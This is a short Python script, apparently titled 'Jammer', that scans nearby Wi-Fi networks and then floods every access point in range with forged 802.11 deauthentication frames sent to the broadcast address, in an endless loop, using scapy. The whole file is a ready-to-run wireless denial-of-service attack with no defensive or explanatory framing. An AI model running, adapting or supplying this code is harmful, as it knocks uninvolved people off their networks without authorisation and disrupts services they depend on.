import wireless, os, sys
from wifi import Cell
from scapy.all import *

uid = os.getuid()
if uid == 0:
	pass
else:
	print('Error! Run it as root!!')
	sys.exit(0)

WIFI = wireless.Wireless()
interface = WIFI.interface()
print('Loading...')
wifi_in_range = Cell.all(interface)
bssids = []

print("""
 ┬┌─┐┌┬┐┌┬┐┌─┐┬─┐
 │├─┤││││││├┤ ├┬┘
└┘┴ ┴┴ ┴┴ ┴└─┘┴└─
By: Anikin Luke

	""")

for wifi in wifi_in_range:
	print(f'Network (ssid): {wifi.ssid}')
	print(f'Network (Bssid) : {wifi.address}')
	print(f'Channel: {wifi.channel}')
	print(f'Nework quality: {wifi.quality}')
	bssids.append(wifi.address)


def jam(address):
	conf.iface = interface
	bssid = address
	client = "FF:FF:FF:FF:FF:FF"
	count = 3
	conf.verb = 0
	packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
	for n in range(int(count)):
		sendp(packet)
		print(f'Deauth num {n} sent via: {conf.iface} to BSSID: {bssid} for Client: {client}')

input('Press Enter to start...')
os.system('clear')

try:

	while True:
		for bssid in bssids:
			print(f"Jamming enabled: {0}".format(bssid))
			jam(bssid)

except KeyboardInterrupt:
	print('\n[x] Closed/Stop successfully')



